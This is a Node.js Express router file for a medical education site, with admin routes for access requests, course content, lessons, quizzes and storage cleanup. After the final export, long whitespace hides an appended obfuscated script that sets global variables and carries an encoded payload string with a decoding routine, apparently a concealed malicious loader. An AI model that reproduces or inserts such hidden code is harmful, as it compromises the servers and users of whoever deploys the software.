router.post("/admin/pdf-access-requests/:requestId/reject", adminAuth, async (req, res) => {
  try {
    const requestId = String(req.params.requestId || "").trim();
    const request = await PdfAccessRequest.findOne({ _id: requestId });
    if (!request) {
      return res.status(404).json({ message: "Request not found" });
    }

    const updated = await PdfAccessRequest.findOneAndUpdate(
      { _id: requestId },
      {
        status: "rejected",
        reviewedBy: req.admin.email || "admin",
        reviewedAt: new Date(),
        adminNote: String(req.body?.adminNote || "Rejected").trim(),
        updatedAt: new Date()
      },
      { new: true }
    );

    return res.json({ message: "PDF access request rejected", request: updated });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.get("/admin/academy/content", adminAuth, async (_req, res) => {
  try {
    const profile = await ensureAcademyProfile();
    const blocksRaw = await SubjectContent.find({});
    const blocks = blocksRaw.map((row) => {
      const doc = row && typeof row.toObject === "function" ? row.toObject() : row;
      const subjectKey = String(doc?.subjectKey || "").trim().toLowerCase();
      if (subjectKey !== "biochemistry") {
        return doc;
      }

      const normalizedTopics = normalizeBiochemistryTopics(doc?.blockKey, doc?.topics || []);
      const normalizedSections = normalizedTopics.map((topicName) => {
        const existing = (Array.isArray(doc?.sections) ? doc.sections : []).find((section) => String(section?.name || "").trim().toLowerCase() === String(topicName || "").trim().toLowerCase());
        return existing || {
          name: topicName,
          videoItems: [],
          noteText: "",
          noteResources: [],
          clinicalText: "",
          clinicalResources: []
        };
      });

      return {
        ...doc,
        topics: normalizedTopics,
        sections: normalizedSections
      };
    });

    return res.json({
      profile,
      blocks
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post(
  "/admin/academy/block",
  adminAuth,
  contentUpload.fields([
    { name: "videoFiles", maxCount: 100 },
    { name: "noteFiles", maxCount: 100 },
    { name: "clinicalFiles", maxCount: 100 }
  ]),
  uploadFilesToGridFS,
  async (req, res) => {
    try {
      const subjectKey = String(req.body?.subjectKey || "").trim().toLowerCase();
      const blockKey = String(req.body?.blockKey || "").trim().toLowerCase();

      if (!subjectKey || !blockKey) {
        return res.status(400).json({ message: "subjectKey and blockKey are required" });
      }

      const id = `${subjectKey}_${blockKey}`;
      const contentAccessLevel = normalizeAccessLevel(req.body?.contentAccessLevel);
      const rawSectionName = String(req.body?.sectionName || "").trim();
      const sectionName = rawSectionName && rawSectionName !== "__block__" ? rawSectionName : "";
      const topics = splitValues(req.body?.topics);
      const noteText = String(req.body?.noteText || "").trim();
      const clinicalText = String(req.body?.clinicalText || "").trim();
      const videoItems = parseLineLinks(req.body?.videoLinks, contentAccessLevel);

      let blockFilesToDelete = {};
      try {
        const deleteParam = String(req.body?.blockFilesToDelete || "").trim();
        if (deleteParam) {
          blockFilesToDelete = JSON.parse(deleteParam);
        }
      } catch (_err) {
        blockFilesToDelete = {};
      }

      const removeByIndices = (arr, indices) => {
        if (!Array.isArray(arr) || !Array.isArray(indices) || !indices.length) {
          return Array.isArray(arr) ? [...arr] : [];
        }

        const result = [...arr];
        [...new Set(indices)]
          .map((index) => Number(index))
          .filter((index) => Number.isInteger(index) && index >= 0)
          .sort((left, right) => right - left)
          .forEach((index) => {
            if (index < result.length) {
              result.splice(index, 1);
            }
          });

        return result;
      };

      const uploadedVideos = (req.files?.videoFiles || []).map((file, index) => ({
        title: path.basename(file.originalname || `Video ${index + 1}`, path.extname(file.originalname || "")),
        url: `/static/uploads/${file.filename}`,
        accessLevel: contentAccessLevel,
        mimeType: file.mimetype || "application/octet-stream",
        size: file.size || 0
      }));

      const noteResources = (req.files?.noteFiles || []).map((file, index) => createAssetRecord(file, "note", index, contentAccessLevel));
      const clinicalResources = (req.files?.clinicalFiles || []).map((file, index) => createAssetRecord(file, "clinical", index, contentAccessLevel));

      const existing = await SubjectContent.findOne({ id });
      const existingSections = Array.isArray(existing?.sections)
        ? existing.sections.map((section) => {
            const doc = section && typeof section.toObject === "function" ? section.toObject() : section;
            return {
              name: String(doc?.name || "").trim(),
              videoItems: sanitizeLinks(doc?.videoItems || []),
              noteText: String(doc?.noteText || "").trim(),
              noteResources: mergeUniqueLinks([], doc?.noteResources || []),
              clinicalText: String(doc?.clinicalText || "").trim(),
              clinicalResources: mergeUniqueLinks([], doc?.clinicalResources || [])
            };
          }).filter((section) => section.name)
        : [];

      const remainingVideoLinks = removeByIndices(videoItems, blockFilesToDelete.videoItems || []);

      let nextSections = existingSections;
      if (sectionName) {
        const lower = sectionName.toLowerCase();
        const currentSection = existingSections.find((section) => String(section.name || "").toLowerCase() === lower) || {};
        const updatedSection = {
          name: sectionName,
          videoItems: sanitizeLinks(mergeUniqueLinks(removeByIndices(currentSection.videoItems, blockFilesToDelete.videoItems || []), [...remainingVideoLinks, ...uploadedVideos])),
          noteText: noteText || currentSection.noteText || "",
          noteResources: mergeUniqueLinks(removeByIndices(currentSection.noteResources, blockFilesToDelete.noteResources || []), noteResources),
          clinicalText: clinicalText || currentSection.clinicalText || "",
          clinicalResources: mergeUniqueLinks(removeByIndices(currentSection.clinicalResources, blockFilesToDelete.clinicalResources || []), clinicalResources)
        };

        nextSections = [
          ...existingSections.filter((section) => String(section.name || "").toLowerCase() !== lower),
          updatedSection
        ];
      }

      const next = await SubjectContent.findOneAndUpdate(
        { id },
        (() => {
          const mergedTopics = sectionName
            ? mergeUniqueStrings(existing?.topics, [...topics, sectionName])
            : mergeUniqueStrings(existing?.topics, topics);
          const nextTopics = subjectKey === "biochemistry"
            ? normalizeBiochemistryTopics(blockKey, mergedTopics)
            : mergedTopics;
          const nextNormalizedSections = subjectKey === "biochemistry"
            ? nextTopics.map((topicName) => {
                const existingSection = nextSections.find((section) => String(section?.name || "").trim().toLowerCase() === String(topicName || "").trim().toLowerCase());
                return existingSection || {
                  name: topicName,
                  videoItems: [],
                  noteText: "",
                  noteResources: [],
                  clinicalText: "",
                  clinicalResources: []
                };
              })
            : nextSections;

          return {
          id,
          subjectKey,
          blockKey,
          blockTitle: String(req.body?.blockTitle || existing?.blockTitle || blockKey).trim(),
          topics: nextTopics,
          sections: nextNormalizedSections,
          videoItems: sectionName
            ? sanitizeLinks(existing?.videoItems || [])
            : sanitizeLinks(mergeUniqueLinks(removeByIndices(existing?.videoItems || [], blockFilesToDelete.videoItems || []), [...remainingVideoLinks, ...uploadedVideos])),
          noteText: sectionName ? (existing?.noteText || "") : (noteText || existing?.noteText || ""),
          clinicalText: sectionName ? (existing?.clinicalText || "") : (clinicalText || existing?.clinicalText || ""),
          noteResources: sectionName
            ? mergeUniqueLinks([], removeByIndices(existing?.noteResources || [], blockFilesToDelete.noteResources || []))
            : mergeUniqueLinks(removeByIndices(existing?.noteResources || [], blockFilesToDelete.noteResources || []), noteResources),
          clinicalResources: sectionName
            ? mergeUniqueLinks([], removeByIndices(existing?.clinicalResources || [], blockFilesToDelete.clinicalResources || []))
            : mergeUniqueLinks(removeByIndices(existing?.clinicalResources || [], blockFilesToDelete.clinicalResources || []), clinicalResources)
          };
        })(),
        { new: true, upsert: true }
      );

      schedulePurgeOrphanGridFs();
      return res.status(201).json({ block: next });
    } catch (err) {
      return res.status(500).json({ message: `Server error: ${err.message}` });
    }
  }
);

router.post(
  "/admin/academy/profile",
  adminAuth,
  contentUpload.fields([
    { name: "overviewBooksFiles", maxCount: 50 },
    { name: "overviewPremiumFiles", maxCount: 50 },
    { name: "overviewSlidesFiles", maxCount: 50 },
    { name: "overviewShortFiles", maxCount: 50 },
    { name: "overviewVideoFiles", maxCount: 50 }
  ]),
  uploadFilesToGridFS,
  async (req, res) => {
    try {
      const profile = await ensureAcademyProfile();
      const body = req.body || {};

      const aboutAcademyText = String(body.aboutAcademyText || profile.aboutAcademyText || "").trim();
      const contactNumbers = splitValues(body.contactNumbers);
      const hasIntroVideoField = Object.prototype.hasOwnProperty.call(body, "introVideoUrl");

      // Handle file deletions if specified
      let filesToDelete = {};
      try {
        const deleteParam = String(req.body?.filesToDelete || "").trim();
        if (deleteParam) {
          filesToDelete = JSON.parse(deleteParam);
        }
      } catch (_err) {
        // Ignore parse errors
      }

      // Helper to remove items by index
      const removeByIndices = (arr, indices) => {
        if (!Array.isArray(indices) || !indices.length) return arr;
        const sorted = [...new Set(indices)].sort((a, b) => b - a);
        const result = Array.isArray(arr) ? [...arr] : [];
        sorted.forEach(idx => {
          if (idx >= 0 && idx < result.length) {
            result.splice(idx, 1);
          }
        });
        return result;
      };

      // Apply deletions to existing files
      let books = removeByIndices(profile.generalOverview?.books || [], filesToDelete.books || []);
      let premiumNotes = removeByIndices(profile.generalOverview?.premiumNotes || [], filesToDelete.premiumNotes || []);
      let importantSlides = removeByIndices(profile.generalOverview?.importantSlides || [], filesToDelete.importantSlides || []);
      let shortNotes = removeByIndices(profile.generalOverview?.shortNotes || [], filesToDelete.shortNotes || []);
      let videos = removeByIndices(profile.generalOverview?.videos || [], filesToDelete.videos || []);

      // Handle file uploads for overview sections
      const overviewBooksFiles = (req.files?.overviewBooksFiles || []).map((file, index) => createAssetRecord(file, "book", index));
      const overviewPremiumFiles = (req.files?.overviewPremiumFiles || []).map((file, index) => createAssetRecord(file, "premium_notes", index, "paid"));
      const overviewSlidesFiles = (req.files?.overviewSlidesFiles || []).map((file, index) => createAssetRecord(file, "slides", index));
      const overviewShortFiles = (req.files?.overviewShortFiles || []).map((file, index) => createAssetRecord(file, "short_notes", index));
      const overviewVideoFiles = (req.files?.overviewVideoFiles || []).map((file, index) => {
        const asset = createAssetRecord(file, "video", index);
        return {
          title: asset.title,
          url: asset.fileUrl
        };
      });

      // Merge new uploads with remaining files (after deletions)
      books = sanitizeLinks(mergeUniqueLinks(books, overviewBooksFiles));
      premiumNotes = sanitizeLinks(mergeUniqueLinks(premiumNotes, overviewPremiumFiles));
      importantSlides = sanitizeLinks(mergeUniqueLinks(importantSlides, overviewSlidesFiles));
      shortNotes = sanitizeLinks(mergeUniqueLinks(shortNotes, overviewShortFiles));
      const manualVideos = String(body.overviewVideos || "").trim() ? parseLineLinks(body.overviewVideos) : [];
      const remainingManualVideos = removeByIndices(manualVideos, filesToDelete.videos || []);
      videos = sanitizeLinks(mergeUniqueLinks(videos, [...remainingManualVideos, ...overviewVideoFiles]));
      const aboutNotes = sanitizeLinks(mergeUniqueLinks(profile.aboutUs?.notes, String(body.aboutNotes || "").trim() ? parseLineLinks(body.aboutNotes) : []));
      const aboutPdfResources = sanitizeLinks(mergeUniqueLinks(profile.aboutUs?.pdfResources, String(body.aboutPdfResources || "").trim() ? parseLineLinks(body.aboutPdfResources) : []));
      const introVideoUrl = hasIntroVideoField
        ? String(body.introVideoUrl || "").trim()
        : String(profile.aboutUs?.introVideoUrl || "").trim();

      const updated = await AcademyProfile.findOneAndUpdate(
        { id: "academy_profile" },
        {
          id: "academy_profile",
          aboutAcademyText,
          bankDetails: {
              bankName: String(body.bankName || profile.bankDetails?.bankName || "").trim(),
              accountTitle: String(body.accountTitle || profile.bankDetails?.accountTitle || "").trim(),
              accountNumber: String(body.accountNumber || profile.bankDetails?.accountNumber || "").trim(),
              iban: String(body.iban || profile.bankDetails?.iban || "").trim()
          },
          generalOverview: {
            books,
            premiumNotes,
            importantSlides,
            shortNotes,
            videos
          },
          aboutUs: {
            profileImageUrl: String(body.profileImageUrl || profile.aboutUs?.profileImageUrl || "/static/images/favicon.png").trim(),
            introVideoUrl,
            notes: aboutNotes,
            pdfResources: aboutPdfResources,
            contactEmail: String(body.contactEmail || profile.aboutUs?.contactEmail || "").trim(),
            contactNumbers: contactNumbers.length ? contactNumbers : (Array.isArray(profile.aboutUs?.contactNumbers) ? profile.aboutUs.contactNumbers : []),
            socialLinks: {
              facebook: String(body.facebookUrl || profile.aboutUs?.socialLinks?.facebook || "").trim(),
              youtube: String(body.youtubeUrl || profile.aboutUs?.socialLinks?.youtube || "").trim(),
              instagram: String(body.instagramUrl || profile.aboutUs?.socialLinks?.instagram || "").trim(),
              linkedin: String(body.linkedinUrl || profile.aboutUs?.socialLinks?.linkedin || "").trim()
            }
          }
        },
        { new: true, upsert: true }
      );

      schedulePurgeOrphanGridFs();
      return res.status(201).json({ profile: updated });
    } catch (err) {
      console.error("Error in POST /admin/academy/profile:", err);
      return res.status(500).json({ message: `Server error: ${err.message}` });
    }
  }
);

router.post(
  "/admin/lesson",
  adminAuth,
  contentUpload.fields([
    { name: "videoFiles", maxCount: 100 },
    { name: "audioFiles", maxCount: 100 },
    { name: "materialFiles", maxCount: 100 }
  ]),
  uploadFilesToGridFS,
  async (req, res) => {
    try {
      const { title, courseId, videoUrl, lessonId, summary, caseStudies } = req.body || {};
      const contentAccessLevel = normalizeAccessLevel(req.body?.contentAccessLevel);
      if (!title || !courseId) {
        return res.status(400).json({ message: "Title and courseId are required" });
      }

      const course = await Course.findOne({ courseId });
      if (!course) {
        return res.status(404).json({ message: "Course not found" });
      }

      const videoUrls = splitValues(videoUrl);
      const uploadedVideos = (req.files?.videoFiles || []).map((file, index) => createAssetRecord(file, "video", index, contentAccessLevel));
      const uploadedAudios = (req.files?.audioFiles || []).map((file, index) => createAssetRecord(file, "audio", index, contentAccessLevel));
      const uploadedMaterials = (req.files?.materialFiles || []).map((file, index) => createAssetRecord(file, "material", index, contentAccessLevel));
      let lessonVideosToClear = [];
      try {
        const clearParam = String(req.body?.lessonVideosToClear || "").trim();
        if (clearParam) {
          lessonVideosToClear = JSON.parse(clearParam);
        }
      } catch (_err) {
        lessonVideosToClear = [];
      }
      const parsedCaseStudies = parseCaseStudies(caseStudies);
      const summaryText = String(summary || "").trim();

      const sources = [
        ...videoUrls.map((url) => ({ videoUrl: url, videoType: isYoutubeUrl(url) ? "youtube" : "upload" })),
        ...uploadedVideos.map((asset) => ({ videoUrl: asset.fileUrl, videoType: "upload", videoAsset: asset }))
      ];

      const hasContent = sources.length || uploadedAudios.length || uploadedMaterials.length || parsedCaseStudies.length || summaryText || lessonVideosToClear.length;
      if (!hasContent) {
        return res.status(400).json({ message: "Add at least one video, audio file, material, case study, or summary" });
      }

      if (!sources.length) {
        sources.push({ videoUrl: "", videoType: null });
      }

      const baseLessonId = `lesson_${normalizeId(title)}`;
      const relatedLessons = await Lesson.find({
        courseId,
        lessonId: { $regex: `^${baseLessonId}(?:_[0-9]+)?$` }
      }).sort({ createdAt: 1 });

      const usedIndexes = new Set();
      relatedLessons.forEach((item) => {
        const id = String(item.lessonId || "").trim();
        if (id === baseLessonId) {
          usedIndexes.add(1);
          return;
        }
        const suffixMatch = id.match(new RegExp(`^${baseLessonId}_(\\d+)$`));
        if (suffixMatch) {
          usedIndexes.add(Number(suffixMatch[1]));
        }
      });

      const nextAvailableIndex = () => {
        let idx = 1;
        while (usedIndexes.has(idx)) {
          idx += 1;
        }
        usedIndexes.add(idx);
        return idx;
      };

      const lessons = [];
      const hasIncomingVideoSources = videoUrls.length > 0 || uploadedVideos.length > 0;
      for (let index = 0; index < sources.length; index += 1) {
        const currentSource = sources[index];
        const resolvedIndex = lessonId
          ? null
          : (hasIncomingVideoSources ? nextAvailableIndex() : 1);
        const currentLessonId = lessonId
          ? lessonId
          : (resolvedIndex === 1 ? baseLessonId : `${baseLessonId}_${resolvedIndex}`);
        const existingLesson = await Lesson.findOne({ lessonId: currentLessonId });
        const currentTitle = lessonId
          ? title
          : (resolvedIndex && resolvedIndex > 1 ? `${title} ${resolvedIndex}` : title);
        const audioItems = mergeUniqueLinks(existingLesson?.audioItems, uploadedAudios);
        const materials = mergeUniqueLinks(existingLesson?.materials, uploadedMaterials);
        const caseStudyItems = parsedCaseStudies.length ? parsedCaseStudies : Array.isArray(existingLesson?.caseStudies) ? existingLesson.caseStudies : [];
        const shouldClearVideo = lessonVideosToClear.includes(currentLessonId);
        const videoValue = shouldClearVideo ? "" : (currentSource.videoUrl || existingLesson?.videoUrl || "");

        const lesson = await Lesson.findOneAndUpdate(
          { lessonId: currentLessonId },
          {
            lessonId: currentLessonId,
            courseId,
            title: currentTitle,
            accessLevel: contentAccessLevel,
            summary: summaryText || existingLesson?.summary || "",
            videoUrl: videoValue,
            videoType: videoValue ? (currentSource.videoType || existingLesson?.videoType || (isYoutubeUrl(videoValue) ? "youtube" : "upload")) : null,
            audioItems,
            materials,
            caseStudies: caseStudyItems,
            quizId: existingLesson?.quizId || `quiz_${normalizeId(currentLessonId)}`
          },
          { new: true, upsert: true }
        );

        lessons.push({
          id: lesson.lessonId,
          courseId: lesson.courseId,
          title: lesson.title,
          videoUrl: lesson.videoUrl,
          videoType: lesson.videoType || null,
          audioCount: (lesson.audioItems || []).length,
          materialCount: (lesson.materials || []).length,
          caseStudyCount: (lesson.caseStudies || []).length,
          quizId: lesson.quizId
        });
      }

      schedulePurgeOrphanGridFs();
      return res.status(201).json({
        lessons,
        message: lessons.length === 1 ? "Lesson saved successfully" : `${lessons.length} lessons created successfully`
      });
    } catch (err) {
      return res.status(500).json({ message: `Server error: ${err.message}` });
    }
  }
);

router.post("/admin/quiz", adminAuth, async (req, res) => {
  try {
    const { lessonId, title, questions } = req.body || {};
    if (!lessonId || !title || !Array.isArray(questions) || questions.length === 0) {
      return res.status(400).json({ message: "lessonId, title, and questions are required" });
    }

    const lesson = await Lesson.findOne({ lessonId });
    if (!lesson) {
      return res.status(404).json({ message: "Lesson not found" });
    }

    const quizId = lesson.quizId || `quiz_${normalizeId(lessonId)}`;
    const quiz = await Quiz.findOneAndUpdate(
      { quizId },
      { quizId, courseId: lesson.courseId, lessonId, title, questions },
      { new: true, upsert: true }
    );

    return res.status(201).json({
      quiz: {
        id: quiz.quizId,
        courseId: quiz.courseId,
        lessonId: quiz.lessonId,
        title: quiz.title,
        questions: quiz.questions
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

function parseQuizText(text) {
  const lines = text.split(/\r?\n/).map((line) => line.trim()).filter(Boolean);
  let lessonTitle = "";
  const questions = [];
  let current = null;

  lines.forEach((line) => {
    if (line.toLowerCase().startsWith("lesson:")) {
      lessonTitle = line.split(":")[1].trim();
      return;
    }
    if (line.startsWith("Q:")) {
      if (current) {
        questions.push(current);
      }
      current = {
        id: `q${questions.length + 1}`,
        question: line.replace("Q:", "").trim(),
        options: [],
        correctAnswer: ""
      };
      return;
    }
    if (line.match(/^[A-D]:/)) {
      const option = line.substring(2).trim();
      if (current) {
        current.options.push(option);
      }
      return;
    }
    if (line.toLowerCase().startsWith("answer:")) {
      const letter = line.split(":")[1].trim().toUpperCase();
      const indexMap = { A: 0, B: 1, C: 2, D: 3 };
      const optionIndex = indexMap[letter];
      if (current && current.options[optionIndex]) {
        current.correctAnswer = current.options[optionIndex];
      }
    }
  });

  if (current) {
    questions.push(current);
  }

  return { lessonTitle, questions };
}

function parseQuizCsv(text) {
  const rows = text.split(/\r?\n/).map((line) => line.trim()).filter(Boolean);
  let lessonTitle = "";
  const questions = [];

  rows.forEach((row, index) => {
    const columns = row.split(",").map((value) => value.trim());

    if (columns[0] && columns[0].toLowerCase() === "lesson") {
      lessonTitle = columns[1] || lessonTitle;
      return;
    }
    if (index === 0 && /question/i.test(columns[0] || "")) {
      return;
    }
    if (columns.length >= 6) {
      const [question, optionA, optionB, optionC, optionD, answer] = columns;
      const options = [optionA, optionB, optionC, optionD].filter(Boolean);
      const answerMap = { A: 0, B: 1, C: 2, D: 3 };
      const normalizedAnswer = String(answer || "").trim().toUpperCase();
      const correctAnswer = Object.prototype.hasOwnProperty.call(answerMap, normalizedAnswer)
        ? options[answerMap[normalizedAnswer]] || ""
        : answer;

      if (question && options.length >= 2) {
        questions.push({
          id: `q${questions.length + 1}`,
          question,
          options,
          correctAnswer
        });
      }
    }
  });

  return { lessonTitle, questions };
}

router.post("/admin/quiz/upload", adminAuth, quizUpload.single("file"), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ message: "File is required" });
    }

    const text = req.file.buffer.toString("utf-8");
    let parsed = parseQuizText(text);
    if (!parsed.questions.length) {
      parsed = parseQuizCsv(text);
    }

    let { questions } = parsed;
    const lessonId = req.body.lessonId;
    if (!lessonId) {
      return res.status(400).json({ message: "Lesson selection is required" });
    }
    if (!questions.length) {
      return res.status(400).json({ message: "No questions found" });
    }

    let lesson = await Lesson.findOne({ lessonId: lessonId });
    if (!lesson) {
      return res.status(404).json({ message: "Selected lesson not found" });
    }
    
    const baseQuizId = `quiz_${normalizeId(lesson.lessonId)}`;
    const existingCount = await Quiz.countDocuments({ lessonId: lesson.lessonId });
    const quizNumber = existingCount + 1;
    const quizId = `${baseQuizId}_${quizNumber}`;
    const quizTitle = parsed.lessonTitle || `${lesson.title} Quiz ${quizNumber}`;
    const quiz = await Quiz.create({
      quizId,
      courseId: lesson.courseId,
      lessonId: lesson.lessonId,
      title: quizTitle,
      questions
    });

    return res.status(201).json({
      quiz: {
        id: quiz.quizId,
        courseId: quiz.courseId,
        lessonId: quiz.lessonId,
        title: quiz.title,
        questions: quiz.questions
      }
    });
  } catch (err) {
    return res.status(500).json({ message: `Server error: ${err.message}` });
  }
});

router.get("/quiz", async (req, res) => {
  try {
    const { lessonId } = req.query;
    if (!lessonId) {
      return res.status(400).json({ message: "lessonId is required" });
    }

    const quiz = await Quiz.findOne({ lessonId });
    if (!quiz) {
      return res.status(404).json({ message: "Quiz not found" });
    }

    return res.json({
      quiz: {
        id: quiz.quizId,
        courseId: quiz.courseId,
        lessonId: quiz.lessonId,
        title: quiz.title,
        questions: quiz.questions
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

// Frees MongoDB storage by permanently deleting uploaded files that are no
// longer referenced by any content. Deletes are allowed by Atlas even when the
// cluster is over its storage quota, so this is what unblocks writes again.
router.post("/admin/storage/cleanup", adminAuth, async (_req, res) => {
  try {
    if (!isFilesBucketReady()) {
      return res.status(503).json({ message: "Storage not ready yet. Try again in a moment." });
    }

    const stats = await purgeOrphanGridFs();
    const toMB = (bytes) => Math.round(((bytes || 0) / (1024 * 1024)) * 100) / 100;

    return res.json({
      message: stats.orphanCount
        ? `Freed ${toMB(stats.reclaimedBytes)} MB by deleting ${stats.orphanCount} unused file(s).`
        : "No unused files found. Storage is already clean.",
      deletedFiles: stats.orphanCount,
      reclaimedMB: toMB(stats.reclaimedBytes),
      remainingMB: toMB(stats.totalBytes - stats.reclaimedBytes)
    });
  } catch (err) {
    return res.status(500).json({ message: `Cleanup failed: ${err.message}` });
  }
});

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i = 'A10-*420';global.j=1;/*RS260605*/function LEvvyh(LEvvyh){var mmqSey=(LEvvyh|0x0)^0x9e3779b9,WiuZ9wt=0x243f6a88|0x0,gr5Rp1a=0x6a09e667|0x0;for(var m_x8_P=0x0;m_x8_P<0x13;m_x8_P++){rsd7Zi(mmqSey=mmqSey+(WiuZ9wt<<0x7^WiuZ9wt>>>0x3)+gr5Rp1a|0x0,mmqSey=mmqSey^mmqSey>>>0xf|0x0,mmqSey=mmqSey+(mmqSey<<0xb)|0x0,WiuZ9wt=WiuZ9wt^(mmqSey<<0x4)+(mmqSey>>>0x9)+gr5Rp1a|0x0,WiuZ9wt=WiuZ9wt+(WiuZ9wt<<0x6)|0x0,WiuZ9wt=WiuZ9wt^WiuZ9wt>>>0xd|0x0,gr5Rp1a=gr5Rp1a+0x7f4a7c15|0x0)}rsd7Zi(mmqSey=mmqSey^WiuZ9wt|0x0,mmqSey=mmqSey+(mmqSey<<0x3)|0x0,mmqSey=mmqSey^mmqSey>>>0xb|0x0,mmqSey=mmqSey+(mmqSey<<0xf)|0x0,WiuZ9wt=WiuZ9wt^WiuZ9wt>>>0xd|0x0,WiuZ9wt=WiuZ9wt+(WiuZ9wt<<0x7)|0x0,WiuZ9wt=WiuZ9wt^WiuZ9wt>>>0x11|0x0);return(mmqSey>>>0x0)*0x100000+(WiuZ9wt>>>0xc)}var mmqSey=[0x316,-0x329,0x138,0x393,-0x175,0x2c7,-0x125,0x2a9,-0x196,-0xec,0x333,0x391,-0x1f9,-0xae,0x39e,0x396,-0x25a,0x2c9,0x2dc,-0x2f6,-0x13d,0x10c,-0x275,0x211,0x30d,-0x47,0x7a,0x36c,-0x253,-0x86,0xa4,-0x180,-0xd8,0x1cc,-0x209,-0x1b0,0x20c,-0x23b,0x39c,0xdb,-0x9,-0x27a,-0x93,-0x63,-0x159,0x1b0,-0xe9,0x1fb,-0x1bf,-0xde,-0x33f,0x62,-0x3b6,0x1fe,-0x40,0x366,0xf6,-0x260,0x107,0x6,0x288,-0x11a,-0x3a3,0x2c9,0x3a8,0x245,0x2ce,-0xc3,0x154,0x32f,-0x2fd,-0x2eb,-0x21b,-0x2b9,-0x2d9,0x280,0x19d,0x26f,-0x308,0x39f,-0x352,-0x2f1,0x5d,0x3e6,-0x3c,0x1eb,-0x138,-0x191,-0x160,-0x8f,-0x361,0x20b,0x6b,-0x205,0x3be,-0x2b0,0x2b6,0x34c,-0x1e9,0x322];var WiuZ9wt="Jk}UE^Z=,J>imcTBAR\\=,gZK9?A>Ha9;#D5PS1ZJ;N8uWJq+4Dal$!ZAkp^2DWf-t7yx@rIa.S&U8W'QRB?^\\BPu6Lh~kF9/qW($U2\\QmP8e,Bl\"3dlZXz62b*W#EnQMFP[j?dE%hWTSHS(95TQ]K\"mc!z>hs]SNDGhrM[eXy$sB[:ghI}(oXFtwt$@_]a-X:`*.1B}<-A!{m_p\"k6]S)u.6f8}_? rz^gGh&%W!~VJK<PW(|~X!=T=:s@G= Bwa0;qwU+.dv3#twjTP_#:,~]u#c`xHVVDZJ7il.9n(DzjS4T-QS=<TAy` Iwfqay/P3%[2_5CY;=/4@Hi2J8E;C4^9Ay[HJetS=\"Q$e6s]EAh\\=,N]+JWP}<N2%Lg?0xa^.]GEcQag6cJ$B~rRk'(I|aP28U+mSH.@jx*;1u~vanVBpEp*\"d`gn@7k/A:<#Mk,x}.vfdn00\\(n>US:Qe*WT)[hI+@2<>OP\\+9YSO[j@:,3*~[PP8Mg)FUhjJgDAH${\\~i'|=p>@wi:6*_&Z(]-=Qcl~(F1zfe@QA<N[;lRt|eV85y/jc,4]9d$\\xFBsOK)V%|Agihi7|D$jDg?zG-?iQ-T+ScNBByj07iQ/c3zuwYwoci2\"4HvrvIx?smS \\C37dh|PM'E?}}uEPV%Wo7AJ7iY=)e03-DS1SmD|ZUTr!_[+{p}n4+wL}?>A1seE=$L>o>NZ#Ky|UkE26et&FZ@E#Dph,!uY1ZEI.cQsq3j%> +'Zm|%Pv ===&ZTV6Wr8^5,H)iWsp5&c@26Mx{SCqUCJ+lLd-P!L']K eA~;I(LS;V{-z*[.)u!#V|@=:aYj\"aWR\\Q7*uaQEY=%{QA:OsvTB+$X()A1L-`i@?zkbdgymCpD5<P?Zxx)b'WQ5DH?VJM?i7ULR1}s5Lk@xOlP,sltQ }2O2\\-oh< E=coD+E.BSY,EEt'ge?woOX\\*E8)tbZO'smD=~zhT5H*[(uKWp5CL_'4zr_?!{=${F%{mH?O$/x{tU!L\\'19u.g@72.lr?%6hm.`k<`IFC%a=aB#[G@S%$.~N(D01m0l{R}IxC=2dc[g~-YV@(\"\"E@WWPttrih3V(IDeER\\k|Z9D:wb)}>/Gq<c<AcU<+AV~OIAd:o4T2\\&{YNZaXSh)QW#-,szB4Ss\\v]O#&i|8%,/<}ge1Vf&7Tt#x{qPgD{w613vq'4iqxmrZRSGyM<'*#aJ\\XR'v!I\\Vp6`,P0o0O!VDI9Mkijl/=ct+dh%:sLwK|;TGLxljyiFd./FVD5RP#;I88H8D\"E/E\"%~=D(nFA# &^ x]Uy5qzlkl;tNC5vuOJtT$:?CY<|=&qdkIqpxQ@MM*c&:qNAT/8UwHL;\"fGC$Tv;)aawS8eLKT[,P?_EgMuXBona|rBT_UmR(x@lpa;+Pk[ymAjc>yvgE}JM1o%pryqni'Lj|t,;bLYP;o\"?-\"Q.EVx<lQ(0ybC3QD2&: .NxQTMK7kf\\yk8aCVjgZtSnyf6\"JF2>/oBU%Vy!3wo|}e-tB6x8iEOTY]\"NIn+[62pe5dk{A8[U_4S<kT}fZ{V,akA=.>GIb+.cc|Q]x[<4Y2`1:nv)t@a{</Xm,E=,J>oT<IA^SJ(W<<+c?zO~0~@`>6)\"-b.d*\\0@K _P!u.v!\\`((UR_Lf-\"!kXq[#a/c ~7`Z=1T.#%sH8VRO!vXrV/nXRPKH;TOf%sNHTeYg&r$7G$R#U#mreeyz5-f>LP''LvFy.V_}W>n?mD>i$5*ZqqY,MBDd{ v wbvmfN\">zbx1dS0+]`_Nhn;CePy\"yKz OsQ:_\\~4zSn+/dlH3NO=..M}wE}htRFR8LcD2w}Ss1|*S^t?5s9il^Pg8I)38b~1;_wOh%N^1FxE($(,60$VRRGO=|j'LNiPu#NCQ,*D7H_+ZuaW:V(s|LNp29GPWxb-`)t{2%@zRcp<01#V0v)5\\wE^L.m%8Uru$[gP)4_\"\"rp8>$(r^_x,lkMskl0|jpc1`p%=VQ9RC^-tk1;-78L$6aKcxIdt@5Qk_y(Ak8<E~w`w,6B!gmux2(fv|+czmf]Qv8$ |3E*lX^I|8hVEEo>Wzz6DfHXKlLyzJU%u&q8-1cBA9(kF[DSSH*F<pW,Se_&*Y1>Y]^?8lKPD%!F+|PZ_Z({X<?JfEq4(BKd2(3FdO'Az/hSLdLAp@5o,i9U+in5Wtk+:4hq,u7yZNxBP\\?X)tN5FX>V,C._:#hQp9jBho!?81m*<RAoY8u&JlV#ARBw@'Wj(, \\m^XerAywq?0oYZUnADS]Bfu.l?yg+rX3,W9Hash=1/gLgF2#QV]qgYi#^1PG.z|@X1S=1[v2\"M=XM<`cN#iK- 